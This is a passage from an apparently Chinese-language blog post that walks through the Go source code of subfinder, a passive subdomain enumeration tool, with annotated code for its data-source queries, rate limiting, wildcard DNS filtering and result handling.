subscraping.Result)<br>s.errors = <span class="hljs-number">0</span><br>s.results = <span class="hljs-number">0</span><br><span class="hljs-comment">// 直接使用协程跑 返回这个通道</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(startTime time.Time)</span></span> &#123;<br>s.timeTaken = time.Since(startTime)<br><span class="hljs-built_in">close</span>(results)<br>&#125;(time.Now())<br><span class="hljs-comment">// 构建请求获取域名的结果</span><br>resp, err := session.SimpleGet(ctx, fmt.Sprintf(<span class="hljs-string">&quot;https://otx.alienvault.com/api/v1/indicators/domain/%s/passive_dns&quot;</span>, domain))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &amp;&amp; resp == <span class="hljs-literal">nil</span> &#123;<br>results &lt;- subscraping.Result&#123;Source: s.Name(), Type: subscraping.Error, Error: err&#125;<br>s.errors++<br>session.DiscardHTTPResponse(resp)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 响应结果解析</span><br><span class="hljs-keyword">var</span> response alienvaultResponse<br><span class="hljs-comment">// Get the response body and decode</span><br>err = json.NewDecoder(resp.Body).Decode(&amp;response)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>results &lt;- subscraping.Result&#123;Source: s.Name(), Type: subscraping.Error, Error: err&#125;<br>s.errors++<br>resp.Body.Close()<br><span class="hljs-keyword">return</span><br>&#125;<br>resp.Body.Close()<br><br><span class="hljs-keyword">if</span> response.Error != <span class="hljs-string">&quot;&quot;</span> &#123;<br>results &lt;- subscraping.Result&#123;<br>Source: s.Name(), Type: subscraping.Error, Error: fmt.Errorf(<span class="hljs-string">&quot;%s, %s&quot;</span>, response.Detail, response.Error),<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 提取结果到 results 中</span><br><span class="hljs-keyword">for</span> _, record := <span class="hljs-keyword">range</span> response.PassiveDNS &#123;<br>results &lt;- subscraping.Result&#123;Source: s.Name(), Type: subscraping.Subdomain, Value: record.Hostname&#125;<br>s.results++<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">return</span> results<br>&#125;<br></code></pre></td></tr></table></figure><p>这样使用协程让收集子域名的速度大大增加，对于一些有速率限制的数据源，subfinder 也做有相应的处理：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Agent)</span></span> buildMultiRateLimiter(ctx context.Context, globalRateLimit <span class="hljs-type">int</span>, rateLimit *subscraping.CustomRateLimit) (*ratelimit.MultiLimiter, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> multiRateLimiter *ratelimit.MultiLimiter<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br><span class="hljs-keyword">for</span> _, source := <span class="hljs-keyword">range</span> a.sources &#123;<br><span class="hljs-keyword">var</span> rl <span class="hljs-type">uint</span><br><span class="hljs-comment">// 如果数据源有速率限制 就使用数据源的 没有就使用默认的</span><br><span class="hljs-keyword">if</span> sourceRateLimit, ok := rateLimit.Custom.Get(strings.ToLower(source.Name())); ok &#123;<br>rl = sourceRateLimitOrDefault(<span class="hljs-type">uint</span>(globalRateLimit), sourceRateLimit)<br>&#125;<br><span class="hljs-keyword">if</span> rl &gt; <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-comment">// 有速率限制的</span><br>multiRateLimiter, err = addRateLimiter(ctx, multiRateLimiter, source.Name(), rl, time.Second)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 没有的就 math.MaxUint32  就最大 不需要限制</span><br>multiRateLimiter, err = addRateLimiter(ctx, multiRateLimiter, source.Name(), math.MaxUint32, time.Millisecond)<br>&#125;<br><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> multiRateLimiter, err<br>&#125;<br></code></pre></td></tr></table></figure><p>速率限制器会被添加到 session 中，也就是 http 请求那里 HTTPRequest ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 获取 ctx 中的数据源名称</span><br>sourceName := ctx.Value(CtxSourceArg).(<span class="hljs-type">string</span>)<br><span class="hljs-comment">// ratelimit 速率控制</span><br>mrlErr := s.MultiRateLimiter.Take(sourceName)<br><span class="hljs-keyword">if</span> mrlErr != <span class="hljs-literal">nil</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, mrlErr<br>&#125;<br><br><span class="hljs-keyword">return</span> httpRequestWrapper(s.Client, req)<br></code></pre></td></tr></table></figure><p>这个就是 subfinder 被动域名收集的具体实现。</p><p>再看一下数据源的处理部分，它是初始化数据源的方式是这样的：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240310125954948.png?imageSlim" alt="image-20240310125954948"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> _, currentSource := <span class="hljs-keyword">range</span> AllSources &#123;<br>NameSourceMap[strings.ToLower(currentSource.Name())] = currentSource<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// New creates a new agent for passive subdomain discovery</span><br><span class="hljs-comment">// 初始化数据源</span><br><span class="hljs-comment">// 1. 所有数据源 useAllSources</span><br><span class="hljs-comment">// 2. 指定的数据源列表 sourceNames</span><br><span class="hljs-comment">// 3. 前面两种都没有指定就使用默认的数据源 currentSource.IsDefault()</span><br><span class="hljs-comment">// 4. 支持递归的数据源 可以查询子域名的子域名 useSourcesSupportingRecurse</span><br><span class="hljs-comment">// 5. 输出一下初始化的 passivetotal map</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">New</span><span class="hljs-params">(sourceNames, excludedSourceNames []<span class="hljs-type">string</span>, useAllSources, useSourcesSupportingRecurse <span class="hljs-type">bool</span>)</span></span> *Agent &#123;<br>sources := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]subscraping.Source, <span class="hljs-built_in">len</span>(AllSources))<br><br><span class="hljs-keyword">if</span> useAllSources &#123;<br>maps.Copy(sources, NameSourceMap)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sourceNames) &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">for</span> _, source := <span class="hljs-keyword">range</span> sourceNames &#123;<br><span class="hljs-keyword">if</span> NameSourceMap[source] == <span class="hljs-literal">nil</span> &#123;<br>gologger.Warning().Msgf(<span class="hljs-string">&quot;There is no source with the name: %s&quot;</span>, source)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>sources[source] = NameSourceMap[source]<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">for</span> _, currentSource := <span class="hljs-keyword">range</span> AllSources &#123;<br><span class="hljs-keyword">if</span> currentSource.IsDefault() &#123;<br>sources[currentSource.Name()] = currentSource<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(excludedSourceNames) &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">for</span> _, sourceName := <span class="hljs-keyword">range</span> excludedSourceNames &#123;<br><span class="hljs-built_in">delete</span>(sources, sourceName)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> useSourcesSupportingRecurse &#123;<br><span class="hljs-keyword">for</span> sourceName, source := <span class="hljs-keyword">range</span> sources &#123;<br><span class="hljs-keyword">if</span> !source.HasRecursiveSupport() &#123;<br><span class="hljs-built_in">delete</span>(sources, sourceName)<br>&#125;<br>&#125;<br>&#125;<br><br>gologger.Debug().Msgf(fmt.Sprintf(<span class="hljs-string">&quot;Selected source(s) for this search: %s&quot;</span>, strings.Join(maps.Keys(sources), <span class="hljs-string">&quot;, &quot;</span>)))<br><br><span class="hljs-keyword">for</span> _, currentSource := <span class="hljs-keyword">range</span> sources &#123;<br><span class="hljs-keyword">if</span> warning, ok := sourceWarnings.Get(strings.ToLower(currentSource.Name())); ok &#123;<br>gologger.Warning().Msg(warning)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Create the agent, insert the sources and remove the excluded sources</span><br>agent := &amp;Agent&#123;sources: maps.Values(sources)&#125;<br><br><span class="hljs-keyword">return</span> agent<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是 dns 解析部分，使用的是 github.com&#x2F;projectdiscovery&#x2F;dnsx&#x2F;libs&#x2F;dnsx 完成的 dns 解析，泛解析的处理方式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// InitWildcards inits the wildcard ips array</span><br><span class="hljs-comment">// dns 解析一个不存在的域名 收集泛解析域名的 hosts 列表</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *ResolutionPool)</span></span> InitWildcards(domain <span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; maxWildcardChecks; i++ &#123;<br>uid := xid.New().String()<br><span class="hljs-comment">// uid 构造一个不可能存在的子域名</span><br>hosts, _ := r.DNSClient.Lookup(uid + <span class="hljs-string">&quot;.&quot;</span> + domain)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(hosts) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;%s is not a wildcard domain&quot;</span>, domain)<br>&#125;<br><br><span class="hljs-comment">// Append all wildcard ips found for domains</span><br><span class="hljs-keyword">for</span> _, host := <span class="hljs-keyword">range</span> hosts &#123;<br>r.wildcardIPs[host] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// 通过黑名单的方式去排除泛解析域名的实现</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *ResolutionPool)</span></span> resolveWorker() &#123;<br><span class="hljs-keyword">for</span> task := <span class="hljs-keyword">range</span> r.Tasks &#123;<br><span class="hljs-keyword">if</span> !r.removeWildcard &#123;<br>r.Results &lt;- Result&#123;Type: Subdomain, Host: task.Host, IP: <span class="hljs-string">&quot;&quot;</span>, Source: task.Source&#125;<br><span class="hljs-keyword">continue</span><br>&#125;<br>hosts, err := r.DNSClient.Lookup(task.Host)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>r.Results &lt;- Result&#123;Type: Error, Host: task.Host, Source: task.Source, Error: err&#125;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(hosts) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">var</span> skip <span class="hljs-type">bool</span><br><span class="hljs-comment">// 判断该子域名的 host 是否在泛解析的 host 列表中</span><br><span class="hljs-keyword">for</span> _, host := <span class="hljs-keyword">range</span> hosts &#123;<br><span class="hljs-comment">// Ignore the host if it exists in wildcard ips map</span><br><span class="hljs-keyword">if</span> _, ok := r.wildcardIPs[host]; ok &#123;<br>skip = <span class="hljs-literal">true</span><br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> !skip &#123;<br>r.Results &lt;- Result&#123;Type: Subdomain, Host: task.Host, IP: hosts[<span class="hljs-number">0</span>], Source: task.Source&#125;<br>&#125;<br>&#125;<br>r.wg.Done()<br>&#125;<br></code></pre></td></tr></table></figure><p>然后在看看 subfinder 是如何处理被动收集的结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//  1. 判断是否需要进行泛解析处理, 需要的话就收集泛解析域名的 host</span><br><span class="hljs-comment">//  2. 调用 EnumerateSubdomainsWithCtx 去跑子域名</span><br><span class="hljs-comment">//  3. 使用协程处理子域名通道中的结果</span><br><span class="hljs-comment">//     3.1 判断该子域名是否是属于主域名</span><br><span class="hljs-comment">//     3.2 替换掉 *.</span><br><span class="hljs-comment">//     3.3 使用 filterAndMatchSubdomain 匹配用户自定义的正则表达式</span><br><span class="hljs-comment">//     3.4 使用 map 做去重 , 并且使用 map 记录去重后每个数据源的结果数量</span><br><span class="hljs-comment">//     3.5 将结果转换为 resolve.HostEntry, 如果需要去除泛解析的话就添加到泛解析的任务队列中</span><br><span class="hljs-comment">//     3.6 等待协程退出 =&gt; 处理结果的协程</span><br><span class="hljs-comment">//     3.7 输出 统计操作</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *Runner)</span></span> EnumerateSingleDomainWithCtx(ctx context.Context, domain <span class="hljs-type">string</span>, writers []io.Writer) <span class="hljs-type">error</span> &#123;<br>gologger.Info().Msgf(<span class="hljs-string">&quot;Enumerating subdomains for %s\n&quot;</span>, domain)<br><br><span class="hljs-comment">// Check if the user has asked to remove wildcards explicitly.</span><br><span class="hljs-comment">// If yes, create the resolution pool and get the wildcards for the current domain</span><br><span class="hljs-keyword">var</span> resolutionPool *resolve.ResolutionPool<br><span class="hljs-keyword">if</span> r.options.RemoveWildcard &#123;<br>resolutionPool = r.resolverClient.NewResolutionPool(r.options.Threads, r.options.RemoveWildcard)<br>err := resolutionPool.InitWildcards(domain)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// Log the error but don&#x27;t quit.</span><br>gologger.Warning().Msgf(<span class="hljs-string">&quot;Could not get wildcards for domain %s: %s\n&quot;</span>, domain, err)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Run the passive subdomain enumeration</span><br>now := time.Now()<br>passiveResults := r.passiveAgent.EnumerateSubdomainsWithCtx(ctx, domain, r.options.Proxy, r.options.RateLimit, r.options.Timeout, time.Duration(r.options.MaxEnumerationTime)*time.Minute, passive.WithCustomRateLimit(r.rateLimit))<br><br>wg := &amp;sync.WaitGroup&#123;&#125;<br>wg.Add(<span class="hljs-number">1</span>)<br><span class="hljs-comment">// Create a unique map for filtering duplicate subdomains out</span><br>uniqueMap := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]resolve.HostEntry)<br><span class="hljs-comment">// Create a map to track sources for each host</span><br>sourceMap := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;)<br>skippedCounts := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br><span class="hljs-comment">// Process the results in a separate goroutine</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> result := <span class="hljs-keyword">range</span> passiveResults &#123;<br><span class="hljs-keyword">switch</span> result.Type &#123;<br><span class="hljs-keyword">case</span> subscraping.Error:<br>gologger.Warning().Msgf(<span class="hljs-string">&quot;Could not run source %s: %s\n&quot;</span>, result.Source, result.Error)<br><span class="hljs-keyword">case</span> subscraping.Subdomain:<br><span class="hljs-comment">// Validate the subdomain found and remove wildcards from</span><br>                <span class="hljs-comment">// 判断是否为主域名的子域</span><br><span class="hljs-keyword">if</span> !strings.HasSuffix(result.Value, <span class="hljs-string">&quot;.&quot;</span>+domain) &#123;<br>skippedCounts[result.Source]++<br><span class="hljs-keyword">continue</span><br>&#125;<br>subdomain := strings.ReplaceAll(strings.ToLower(result.Value), <span class="hljs-string">&quot;*.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">// 正则匹配 提取出来子域名</span><br><span class="hljs-keyword">if</span> matchSubdomain := r.filterAndMatchSubdomain(subdomain); matchSubdomain &#123;<br><span class="hljs-keyword">if</span> _, ok := uniqueMap[subdomain]; !ok &#123;<br>sourceMap[subdomain] = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;)<br>&#125;<br><br><span class="hljs-comment">// Log the verbose message about the found subdomain per source</span><br><span class="hljs-keyword">if</span> _, ok := sourceMap[subdomain][result.Source]; !ok &#123;<br>gologger.Verbose().Label(result.Source).Msg(subdomain)<br>&#125;<br><br>sourceMap[subdomain][result.Source] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br><br><span class="hljs-comment">// Check if the subdomain is a duplicate. If not,</span><br><span class="hljs-comment">// send the subdomain for resolution.</span><br><span class="hljs-keyword">if</span> _, ok := uniqueMap[subdomain]; ok &#123;<br>skippedCounts[result.Source]++<br><span class="hljs-keyword">continue</span><br>&#125;<br><br>hostEntry := resolve.HostEntry&#123;Domain: domain, Host: subdomain, Source: result.Source&#125;<br><br>uniqueMap[subdomain] = hostEntry<br><span class="hljs-comment">// If the user asked to remove wildcard then send on the resolve</span><br><span class="hljs-comment">// queue. Otherwise, if mode is not verbose print the results on</span><br><span class="hljs-comment">// the screen as they are discovered.</span><br><span class="hljs-keyword">if</span> r.options.RemoveWildcard &#123;<br>resolutionPool.Tasks &lt;- hostEntry<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">// Close the task channel only if wildcards are asked to be removed</span><br><span class="hljs-keyword">if</span> r.options.RemoveWildcard &#123;<br><span class="hljs-built_in">close</span>(resolutionPool.Tasks)<br>&#125;<br>wg.Done()<br>&#125;()<br><br><span class="hljs-comment">// If the user asked to remove wildcards, listen from the results</span><br><span class="hljs-comment">// queue and write to the map. At the end, print the found results to the screen</span><br>foundResults := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]resolve.Result)<br><span class="hljs-keyword">if</span> r.options.RemoveWildcard &#123;<br><span class="hljs-comment">// Process the results coming from the resolutions pool</span><br><span class="hljs-keyword">for</span> result := <span class="hljs-keyword">range</span> resolutionPool.Results &#123;<br><span class="hljs-keyword">switch</span> result.Type &#123;<br><span class="hljs-keyword">case</span> resolve.Error:<br>gologger.Warning().Msgf(<span class="hljs-string">&quot;Could not resolve host: %s\n&quot;</span>, result.Error)<br><span class="hljs-keyword">case</span> resolve.Subdomain:<br><span class="hljs-comment">// Add the found subdomain to a map.</span><br><span class="hljs-keyword">if</span> _, ok := foundResults[result.Host]; !ok &#123;<br>foundResults[result.Host] = result<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>wg.Wait()<br>outputWriter := NewOutputWriter(r.options.JSON)<br><span class="hljs-comment">// Now output all results in output writers</span><br><span class="hljs-comment">// 遍历好所有的 writer 进行输出操作</span><br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br><span class="hljs-keyword">for</span> _, writer := <span class="hljs-keyword">range</span> writers &#123;<br><span class="hljs-keyword">if</span> r.options.HostIP &#123;<br>err = outputWriter.WriteHostIP(domain, foundResults, writer)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> r.options.RemoveWildcard &#123;<br>err = outputWriter.WriteHostNoWildcard(domain, foundResults, writer)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> r.options.CaptureSources &#123;<br>err = outputWriter.WriteSourceHost(domain, sourceMap, writer)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = outputWriter.WriteHost(domain, uniqueMap, writer)<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>gologger.Error().Msgf(<span class="hljs-string">&quot;Could not write results for %s: %s\n&quot;</span>, domain, err)<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Show found subdomain count in any case.</span><br>duration := durafmt.Parse(time.Since(now)).LimitFirstN(maxNumCount).String()<br><span class="hljs-keyword">var</span> numberOfSubDomains <span class="hljs-type">int</span><br><span class="hljs-keyword">if</span> r.options.RemoveWildcard &#123;<br>numberOfSubDomains = <span class="hljs-built_in">len</span>(foundResults)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>numberOfSubDomains = <span class="hljs-built_in">len</span>(uniqueMap)<br>&#125;<br><br><span class="hljs-keyword">if</span> r.options.ResultCallback != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> r.options.RemoveWildcard &#123;<br><span class="hljs-keyword">for</span> host, result := <span class="hljs-keyword">range</span> foundResults &#123;<br>r.options.ResultCallback(&amp;resolve.HostEntry&#123;Domain: host, Host: result.Host, Source: result.Source&#125;)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> uniqueMap &#123;<br>r.options.ResultCallback(&amp;v)<br>&#125;<br>&#125;<br>&#125;<br>gologger.Info().Msgf(<span class="hljs-string">&quot;Found %d subdomains for %s in %s\n&quot;</span>, numberOfSubDomains, domain, duration)<br><br><span class="hljs-keyword">if</span> r.options.Statistics &#123;<br>gologger.Info().Msgf(<span class="hljs-string">&quot;Printing source statistics for %s&quot;</span>, domain)<br>statistics := r.passiveAgent.GetStatistics()<br><span class="hljs-comment">// This is a hack to remove the skipped count from the statistics</span><br><span class="hljs-comment">// as we don&#x27;t want to show it in the statistics.</span><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Design a better way to do this.</span><br><span class="hljs-keyword">for</span> source, count := <span class="hljs-keyword">range</span> skippedCounts &#123;<br><span class="hljs-keyword">if</span> stat, ok := statistics[source]; ok &#123;<br>stat.Results -= count<br>statistics[source] = stat<br>&#125;<br>&#125;<br>printStatistics(statistics)<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里它使用了 filterAndMatchSubdomain 去实现了用户自定义拦截、匹配的正则：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 